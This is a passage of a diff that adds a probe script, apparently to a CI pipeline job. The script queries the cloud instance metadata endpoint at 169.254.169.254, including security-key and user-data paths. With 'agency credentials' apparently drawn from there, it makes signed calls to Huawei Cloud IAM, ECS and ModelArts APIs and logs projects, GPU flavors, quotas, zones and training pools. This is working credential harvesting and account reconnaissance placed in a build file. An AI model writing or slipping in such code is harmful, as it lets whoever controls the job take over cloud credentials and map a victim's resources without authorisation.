+                  if isinstance(az, str):
+                      m = re.match(r'^([a-z]{2}-[a-z]+-\d+)', az)
+                      if m:
+                          region = m.group(1)
+                  if not region:
+                      region = os.environ.get('C211_REGION', 'cn-southwest-2')
+                  project = md.get('project_id') if isinstance(md, dict) else None
+                  print('ISSUER_REGION=%s ISSUER_AZ=%s ISSUER_PROJECT_FROM_METADATA=%s' % (region, az, project))
+                  iam_url = 'https://iam.myhuaweicloud.com/v3/auth/projects'
+                  st, body, note = signed_get(iam_url)
+                  print('IAM_IDENTITY tag=GetUserAppId-equivalent call=%s status=%s bytes=%d note=%s' % (
+                      iam_url, st, len(body or b''), note))
+                  if st == 200:
+                      try:
+                          d = json.loads(body)
+                          projs = d.get('projects') or []
+                          print('IAM_PROJECTS count=%d' % len(projs))
+                          for p in projs[:12]:
+                              print('IAM_PROJECT name=%s id=%s domain_id=%s enabled=%s' % (
+                                  str(p.get('name'))[:60], str(p.get('id'))[:64], str(p.get('domain_id'))[:64], p.get('enabled')))
+                          if not project and projs:
+                              project = projs[0].get('id')
+                      except Exception as e:
+                          print('IAM_IDENTITY_PARSE_FAIL %s' % type(e).__name__)
+                  elif st is not None:
+                      print('IAM_IDENTITY_BODY %s' % head(body))
+                  if project:
+                      u = 'https://ecs.%s.myhuaweicloud.com/v1/%s/cloudservers/flavors%s' % (
+                          region, project, ('?availability_zone=' + _enc(az)) if az else '')
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_FLAVORS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              fl = d.get('flavors') or []
+                              gpu = [f for f in fl if re.match(r'^(p\d|g\d|pi\d|ai\d)', str(f.get('name', '')))]
+                              print('ECS_FLAVORS_TOTAL %d GPU_NAME_HITS %d' % (len(fl), len(gpu)))
+                              for f in gpu[:40]:
+                                  print('ECS_GPU_FLAVOR name=%s vcpus=%s ram=%s extras=%s' % (
+                                      f.get('name'), f.get('vcpus'), f.get('ram'),
+                                      json.dumps(f.get('os_extra_specs') or {})[:160]))
+                              print('ECS_FLAVOR_NAMES_SAMPLE ' + ','.join(str(f.get('name')) for f in fl[:40]))
+                          except Exception as e:
+                              print('ECS_FLAVORS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('ECS_FLAVORS_BODY %s' % head(body))
+                      u = 'https://ecs.%s.myhuaweicloud.com/v2.1/%s/os-quota-sets/%s' % (region, project, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_QUOTA status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              qs = d.get('quota_set') or d
+                              print('ECS_QUOTA_KEYS ' + ','.join(sorted(str(k) for k in qs.keys()))[:400])
+                              shown = 0
+                              for k in sorted(str(x) for x in qs.keys()):
+                                  v = qs.get(k)
+                                  if isinstance(v, dict) and ('limit' in v or 'in_use' in v or 'quota' in v):
+                                      print('ECS_QUOTA_ITEM %s limit=%s in_use=%s quota=%s' % (k, v.get('limit'), v.get('in_use'), v.get('quota')))
+                                  elif isinstance(v, (int, str)):
+                                      print('ECS_QUOTA_ITEM %s value=%s' % (k, v))
+                                  else:
+                                      continue
+                                  shown += 1
+                                  if shown >= 40:
+                                      break
+                          except Exception as e:
+                              print('ECS_QUOTA_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('ECS_QUOTA_BODY %s' % head(body))
+                      u = 'https://ecs.%s.myhuaweicloud.com/v2.1/%s/os-availability-zone' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('ECS_AZS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              zs = d.get('availabilityZoneInfo') or d.get('availability_zones') or []
+                              print('ECS_AZS_TOTAL %d' % len(zs))
+                              for z in zs[:20]:
+                                  if isinstance(z, dict):
+                                      print('ECS_AZ name=%s state=%s' % (str(z.get('zoneName') or z.get('zone_name'))[:60], z.get('zoneState') or z.get('zone_state')))
+                          except Exception as e:
+                              print('ECS_AZS_PARSE_FAIL %s' % type(e).__name__)
+                      u = 'https://modelarts.%s.myhuaweicloud.com/v1/%s/pools?limit=20' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('MODELARTS_POOLS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              pools = d.get('pools') or d.get('items') or []
+                              print('MODELARTS_POOLS_TOTAL %d' % len(pools))
+                              for p in pools[:20]:
+                                  if isinstance(p, dict):
+                                      print('MODELARTS_POOL %s' % json.dumps({k: p.get(k) for k in ('metadata', 'spec', 'status', 'name', 'pool_name', 'state') if p.get(k) is not None})[:300])
+                          except Exception as e:
+                              print('MODELARTS_POOLS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('MODELARTS_POOLS_BODY %s' % head(body))
+                      u = 'https://modelarts.%s.myhuaweicloud.com/v1/%s/job/resource-specs?job_type=train' % (region, project)
+                      st, body, note = signed_get(u, timeout=15)
+                      print('MODELARTS_SPECS status=%s bytes=%d note=%s' % (st, len(body or b''), note))
+                      if st == 200:
+                          try:
+                              d = json.loads(body)
+                              specs = d.get('specs') or d.get('resource_specs') or []
+                              print('MODELARTS_SPECS_TOTAL %d' % len(specs))
+                              for s in specs[:40]:
+                                  if isinstance(s, dict):
+                                      print('MODELARTS_SPEC %s' % json.dumps(s)[:200])
+                          except Exception as e:
+                              print('MODELARTS_SPECS_PARSE_FAIL %s' % type(e).__name__)
+                      elif st is not None:
+                          print('MODELARTS_SPECS_BODY %s' % head(body))
+                  else:
+                      print('ISSUER_GPU_INVENTORY_SKIPPED reason=no_project_id')
+                  print('ISSUER_DONE job=%s' % JOB)
+          else:
+              print('ISSUER_NOT_ATTEMPTED reason=no_complete_agency_credential')
+
+          print('IMDS_PROBE_END job=%s nonce=%s' % (JOB, NONCE))
+
+          PYEOF
+          else
+            echo C211_PY3_ABSENT
+            BASE="${C211_IMDS_BASE:-http://169.254.169.254}"
+            for p in $(printf '%s\n' /latest/meta-data/instance-id /latest/meta-data/local-ipv4 /latest/meta-data/hostname /latest/meta-data/placement/availability-zone /openstack/latest/meta_data.json /openstack/latest/network_data.json /openstack/latest/vendor_data.json /openstack/latest/securitykey /openstack/latest/user_data /latest/meta-data/c211-bogus-noctl); do
+              tag=IMDS; case "$p" in *c211-bogus*) tag=CTL;; esac
+              if command -v curl >/dev/null 2>&1; then
+                out=$(curl -s --noproxy '*' -m 3 -w '\nC211_HTTP=%{http_code}' "$BASE$p" 2>/dev/null)
+                body=${out%$'\n'C211_HTTP=*}
+                code=${out##*C211_HTTP=}
+                b=$(printf '%s' "$body" | wc -c)
+                h=$(printf '%s' "$body" | sha256sum | cut -c1-32)
+                echo "$tag path=$p status=$code bytes=$b sha256=$h"
+              else
+                echo "$tag path=$p FAIL no_http_client"
+              fi
+            done
+            echo ISSUER_NOT_ATTEMPTED reason=no_python3
+          fi
+          echo "C211_PROBE_END job=${C211_JOB} nonce=${C211_NONCE}"
+          exit 0
